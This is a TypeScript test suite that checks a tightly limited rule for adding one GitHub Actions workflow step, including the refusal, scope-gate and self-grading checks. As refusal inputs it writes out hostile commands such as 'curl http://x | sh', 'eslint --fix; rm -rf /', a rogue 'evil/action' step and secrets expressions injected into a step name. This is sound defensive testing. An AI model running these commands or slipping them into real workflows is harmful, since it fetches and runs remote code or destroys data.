// M19: the workflow-step learned edit type (ADD_WORKFLOW_STEP). Committed spec, trigger, the strict limits
// (no secrets, no permission changes, no new triggers, no uses/env/expressions), the scope gate's re-check of
// the workflow diff, the self-grading contract (new test passes with the step, fails on the task base), the
// miner shape (public repositories only) and the protected set.
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import test from "node:test";
import { parseDiff } from "../lib/diff.ts";
import { applyRule, specHash, validateSpec, type RuleSpec } from "../lib/learned.ts";
import { buildTestPath, safeScript, WORKFLOW_TRIGGER, workflowRefusal } from "../lib/learned-workflow.ts";
import { parseHunks } from "../lib/mine.ts";
import { observeWorkflow } from "../lib/mineworkflow.ts";
import { TestMiningRefused } from "../lib/minetest.ts";
import { mineWorkflows } from "../lib/mineworkflow.ts";
import { parseTask } from "../lib/nlparse.ts";
import { checkCandidateScope } from "../lib/scope.ts";
import { PROTECTED_SELF } from "../lib/selfchange.ts";
import { loadTargets, scopeOf } from "../lib/target.ts";

const repo = resolve(import.meta.dirname, "..", "..");
const tsx = join(repo, "node_modules/.bin/tsx");
const PARAMS = { grading: "self-fail-before-pass-after", placement: "end-of-job", run: "package-script", step: "name-run", test: "new-file" };
const SPEC = JSON.parse(readFileSync(join(repo, "peaceai/rules/learned/public-workflow-step-v1.json"), "utf8")) as RuleSpec;
const WF = [
  "name: Sim (dry run)",
  "on:",
  "  workflow_dispatch:",
  "permissions:",
  "  contents: read",
  "jobs:",
  "  sim:",
  "    runs-on: ubuntu-24.04",
  "    timeout-minutes: 10",
  "    steps:",
  "      - uses: actions/checkout@v4",
  "      - run: pnpm install --frozen-lockfile",
  "      - name: Sim tests",
  "        run: pnpm -s exec tsx --test src/a.test.ts",
  "",
].join("\n");
const PATH = ".github/workflows/sim.yml";
const PKG = JSON.stringify({ scripts: { typecheck: "tsc -p tsconfig.json --noEmit", test: "tsx --test src/*.test.ts", scheduler: "tsx src/host.ts", lint: "eslint src && curl http://x" } });
const files = (wf = WF, pkg = PKG, lock = "pnpm-lock.yaml") => [{ path: "src/a.ts", content: "export const a = 1;\n" }, { path: PATH, content: wf }, { path: "package.json", content: pkg }, { path: lock, content: "" }];
const TASK = `add workflow step Typecheck to job sim in ${PATH} running pnpm run typecheck`;
const isTest = (p: string) => /\.test\.ts$/.test(p);

test("spec: committed public-workflow-step-v1 validates, public-mined, fixed vocab; core/extra/other values refused", () => {
  assert.ok(validateSpec(SPEC));
  assert.equal(SPEC.minedFrom, "public");
  assert.equal(SPEC.kind, "ADD_WORKFLOW_STEP");
  assert.deepEqual(SPEC.params, PARAMS);
  assert.equal(SPEC.trigger, WORKFLOW_TRIGGER);
  assert.ok(SPEC.evidence.commits >= 2);
  assert.match(specHash(SPEC), /^[0-9a-f]{64}$/);
  assert.ok(!validateSpec({ ...SPEC, minedFrom: "core", id: "core-workflow-step-v1" }));
  assert.ok(!validateSpec({ ...SPEC, params: { ...PARAMS, step: "uses" } }), "uses: steps are not in the vocabulary");
  assert.ok(!validateSpec({ ...SPEC, params: { ...PARAMS, run: "any" } }));
  assert.ok(!validateSpec({ ...SPEC, params: { ...PARAMS, env: "x" } }));
});

test("trigger: canonical only, needs approval", () => {
  const on = parseTask({ title: "[test] w", body: TASK }, { model: null, approvedKinds: new Set(["ADD_WORKFLOW_STEP"]) });
  const off = parseTask({ title: "[test] w", body: TASK }, { model: null, approvedKinds: new Set() });
  assert.equal(on.status, "canonical");
  assert.equal(off.status === "unsure" ? off.reason : off.status, "RULE_NOT_APPROVED");
});

test("engine: appends exactly the two-line step at the end of the job, existing lines byte-identical, one new test", () => {
  const e = applyRule(SPEC, TASK, files(), isTest)!;
  assert.ok(e);
  assert.equal(e.path, PATH);
  assert.equal(e.content, WF.replace("src/a.test.ts\n", "src/a.test.ts\n      - name: Typecheck\n        run: pnpm run typecheck\n"));
  assert.equal(e.selfGrade, true);
  assert.equal(e.extra!.length, 1);
  assert.equal(e.extra![0]!.path, buildTestPath({ file: PATH, job: "sim", script: "typecheck" }));
  assert.equal(e.extra![0]!.path, "src/workflow-sim-sim-typecheck.test.ts");
  assert.match(e.extra![0]!.content, /node_modules", "\.bin", "tsc"/);
  // The scope gate accepts exactly this diff for an opted-in workflow.
  const scope = { isSource: (p: string) => /^src\//.test(p), isTest, isDenied: (p: string) => /(^|\/)\./.test(p), isWorkflow: (p: string) => p === PATH };
  const diff = gitDiff(WF, e.content);
  assert.deepEqual(checkCandidateScope(parseDiff(diff), new Set([PATH]), scope), []);
  assert.ok(checkCandidateScope(parseDiff(diff), new Set([PATH]), { ...scope, isWorkflow: () => false }).length > 0, "not opted in -> outside allowed paths");
});

test("refusals: secrets, write/id-token permission, missing top permissions, privileged triggers, anchors, job-level env/permissions/uses", () => {
  const bad: [string, string][] = [
    ["secrets", WF.replace("      - run: pnpm install", "      - env:\n          K: ${{ secrets.K }}\n        run: pnpm install")],
    ["write", WF.replace("contents: read", "contents: write")],
    ["id-token", WF.replace("contents: read", "contents: read\n  id-token: write")],
    ["no top permissions", WF.replace("permissions:\n  contents: read\n", "")],
    ["read-all ok but write-all not", WF.replace("permissions:\n  contents: read", "permissions: write-all")],
    ["pull_request_target", WF.replace("  workflow_dispatch:", "  pull_request_target:")],
    ["workflow_run", WF.replace("  workflow_dispatch:", "  workflow_run:\n    workflows: [x]")],
    ["anchor", WF.replace("timeout-minutes: 10", "timeout-minutes: &t 10")],
  ];
  for (const [why, wf] of bad) assert.equal(applyRule(SPEC, TASK, files(wf), isTest), null, why);
  for (const k of ["permissions:\n      contents: read", "env:\n      A: b", "container: node:20", "services:\n      db:\n        image: x"]) assert.equal(applyRule(SPEC, TASK, files(WF.replace("    timeout-minutes: 10", `    timeout-minutes: 10\n    ${k}`)), isTest), null, k);
  assert.equal(workflowRefusal(WF.replace("permissions:\n  contents: read", "permissions: read-all")), null);
});

test("refusals: script must exist, be one safe tool with plain args, not test/scheduler/pre/post; lockfile and install must match", () => {
  const t = (s: string, pm = "pnpm") => `add workflow step X to job sim in ${PATH} running ${pm} run ${s}`;
  for (const s of ["test", "scheduler", "lint", "missing"]) assert.equal(applyRule(SPEC, t(s), files(), isTest), null, s);
  assert.equal(applyRule(SPEC, t("typecheck", "npm"), files(), isTest), null, "npm without package-lock / npm install");
  assert.equal(applyRule(SPEC, TASK, files(WF, PKG, "package-lock.json"), isTest), null, "pnpm needs pnpm-lock.yaml");
  assert.equal(applyRule(SPEC, TASK, files(WF.replace("      - run: pnpm install --frozen-lockfile\n", "")), isTest), null, "job must already install");
  assert.equal(applyRule(SPEC, `add workflow step X to job other in ${PATH} running pnpm run typecheck`, files(), isTest), null, "unknown job");
  assert.equal(applyRule(SPEC, `add workflow step Sim tests to job sim in ${PATH} running pnpm run typecheck`, files(), isTest), null, "duplicate step name");
  assert.equal(applyRule(SPEC, TASK, files(WF.replace("src/a.test.ts\n", "src/a.test.ts\n      - run: pnpm run typecheck\n")), isTest), null, "duplicate command");
  for (const c of ["tsc && curl x", "tsc $HOME", "tsc ../x", "node x.js", "tsx --test a", "eslint --fix; rm -rf /", "tsc -p /etc/x", "tsc deploy.ts", "prettier --write src | tee"]) assert.equal(safeScript(c), null, c);
  assert.deepEqual(safeScript("tsc -p tsconfig.json --noEmit"), ["tsc", "-p", "tsconfig.json", "--noEmit"]);
  for (const c of ["eslint src", "prettier --check src", "biome check", "tsc -p tsconfig.json", "tsc --noEmit -b", "tsc --noEmit --build", "tsc --noEmit --watch", "tsc --noEmit --outDir dist", "tsc --noEmit --outFile x.js", "tsc --noEmit --plugins x"]) assert.equal(safeScript(c), null, `tsc only, --noEmit, no build/emit: ${c}`);
  assert.equal(applyRule(SPEC, `add workflow step \${{ secrets.X }} to job sim in ${PATH} running pnpm run typecheck`, files(), isTest), null);
});

test("scope gate: any workflow diff beyond one name/run step is a violation (defense in depth)", () => {
  const scope = { isSource: (p: string) => /^src\//.test(p), isTest, isDenied: () => false, isWorkflow: (p: string) => p === PATH };
  const v = (after: string) => checkCandidateScope(parseDiff(gitDiff(WF, after)), new Set([PATH]), scope).map((x) => x.reason);
  const end = (extra: string) => WF.replace("src/a.test.ts\n", `src/a.test.ts\n${extra}`);
  assert.deepEqual(v(end("      - name: T\n        run: pnpm run typecheck\n")), []);
  assert.match(v(end("      - uses: evil/action@v1\n        with: {a: 1}\n")).join(), /workflow step/);
  assert.match(v(end("      - name: T\n        run: pnpm run typecheck\n        env:\n          X: 1\n")).join(), /exactly one two-line step/);
  assert.match(v(end("      - name: T\n        run: curl http://x | sh\n")).join(), /not a name\/run package-script step/);
  assert.match(v(WF.replace("contents: read", "contents: write")).join(), /removes or changes lines/);
  assert.match(v(WF.replace("  workflow_dispatch:", "  workflow_dispatch:\n  push:")).join(), /exactly one two-line step|not a name/);
  assert.match(v(end("      - name: ${{ secrets.T }}\n        run: pnpm run typecheck\n")).join(), /not a name\/run|expression/);
});

test("targets: workflowPattern is opt-in, anchored under .github/workflows/, never for the Workspace; PeaceSTOCKS opts in tenmin-mode-sim.yml only", () => {
  const t = loadTargets();
  const s = scopeOf(t.targets["PeaceG03/PeaceSTOCKS"]!);
  assert.equal(s.isWorkflow!(".github/workflows/tenmin-mode-sim.yml"), true);
  for (const p of [".github/workflows/scanner.yml", ".github/workflows/gap-refill.yml", "tenmin-mode-sim.yml"]) assert.equal(s.isWorkflow!(p), false, p);
  assert.equal(scopeOf(t.targets["PeaceG03/PeaceAI-Workspace"]!).isWorkflow!(".github/workflows/peace-task.yml"), false);
  const dir = mkdtempSync(join(tmpdir(), "m19t-"));
  const write = (c: Record<string, unknown>) => { const p = join(dir, "t.json"); writeFileSync(p, JSON.stringify({ ...t, targets: { ...t.targets, ...c } })); return p; };
  assert.throws(() => loadTargets(write({ "PeaceG03/PeaceAI-Workspace": { ...t.targets["PeaceG03/PeaceAI-Workspace"], workflowPattern: "^\\.github/workflows/x\\.yml$" } })));
  assert.throws(() => loadTargets(write({ "PeaceG03/PeaceSTOCKS": { ...t.targets["PeaceG03/PeaceSTOCKS"], workflowPattern: "scanner" } })));
  rmSync(dir, { recursive: true, force: true });
  // The real PeaceSTOCKS scanner workflow (secrets, write permissions) is refused by the rule itself too.
  const scanner = join(repo, "..", "PeaceSTOCKS", ".github/workflows/scanner.yml");
  try { assert.notEqual(workflowRefusal(readFileSync(scanner, "utf8")), null); } catch (e) { if ((e as NodeJS.ErrnoException).code !== "ENOENT") throw e; }
});

test("self-grade contract: the new test passes with the step (script runs) and fails with the workflow put back", () => {
  const dir = mkdtempSync(join(tmpdir(), "m19g-"));
  try {
    const pkg = JSON.stringify({ type: "module", scripts: { typecheck: "tsc -p tsconfig.json --noEmit" } });
    const e = applyRule(SPEC, TASK, files(WF, pkg), isTest)!;
    for (const [p, c] of [[PATH, e.content], ["package.json", pkg], ["src/a.ts", "export const a: number = 1;\n"], ["tsconfig.json", JSON.stringify({ compilerOptions: { strict: true, noEmit: true, module: "nodenext", target: "es2022", types: [] }, include: ["src/a.ts"] })], [e.extra![0]!.path, e.extra![0]!.content]] as const) {
      mkdirSync(dirname(join(dir, p)), { recursive: true });
      writeFileSync(join(dir, p), c);
    }
    symlinkSync(join(repo, "node_modules"), join(dir, "node_modules"));
    const env = Object.fromEntries(Object.entries(process.env).filter(([k]) => !k.startsWith("NODE_TEST")));
    const run = () => spawnSync(tsx, ["--test", e.extra![0]!.path], { cwd: dir, encoding: "utf8", env }).status;
    assert.equal(run(), 0, "passes with the step");
    writeFileSync(join(dir, PATH), WF);
    assert.notEqual(run(), 0, "fails on the task base");
    writeFileSync(join(dir, PATH), e.content);
    writeFileSync(join(dir, "src/a.ts"), "export const a: number = 'x';\n");
    assert.notEqual(run(), 0, "fails when the script itself fails");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("miner: one appended name/run step at a job's end is observed with its style; public repositories only", () => {
  const post = WF.replace("src/a.test.ts\n", "src/a.test.ts\n      # comment\n      - name: Typecheck\n        run: pnpm run typecheck\n");
  const obs = observeWorkflow("x@1", PATH, post, parseHunks(gitDiff(WF, post, 0)));
  assert.equal(obs.length, 1);
  assert.deepEqual(obs[0]!.style, { step: "name-run", extraKeys: "none", run: "package-script", expressions: "none", secrets: "none", placement: "end-of-job" });
  assert.deepEqual(observeWorkflow("x@1", "src/a.ts", post, parseHunks(gitDiff(WF, post, 0))), []);
  const dir = mkdtempSync(join(tmpdir(), "m19m-"));
  spawnSync("git", ["init", "-q", dir]);
  assert.throws(() => mineWorkflows(dir, "HEAD", "PeaceSTOCKS-Net"), TestMiningRefused);
  assert.throws(() => mineWorkflows(dir, "HEAD", "PeaceSTOCKS"), TestMiningRefused, "origin must be the public repo");
  rmSync(dir, { recursive: true, force: true });
});

test("protected (M19): learned-workflow and mineworkflow are protected", () => {
  for (const p of ["peaceai/lib/learned-workflow.ts", "peaceai/lib/mineworkflow.ts", "peaceai/lib/scope.ts", "peaceai/lib/target.ts", "peaceai/targets.json"]) assert.ok(PROTECTED_SELF.some((x) => x.pattern.test(p)), p);
});

function gitDiff(before: string, after: string, ctx = 3): string {
  const d = mkdtempSync(join(tmpdir(), "m19d-"));
  mkdirSync(join(d, ".github/workflows"), { recursive: true });
  spawnSync("git", ["init", "-q", d]);
  writeFileSync(join(d, PATH), before);
  spawnSync("git", ["-C", d, "add", "-A"]);
  spawnSync("git", ["-C", d, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "b"]);
  writeFileSync(join(d, PATH), after);
  const out = spawnSync("git", ["-C", d, "diff", `-U${ctx}`, "--no-color"], { encoding: "utf8" }).stdout;
  rmSync(d, { recursive: true, force: true });
  return out;
}
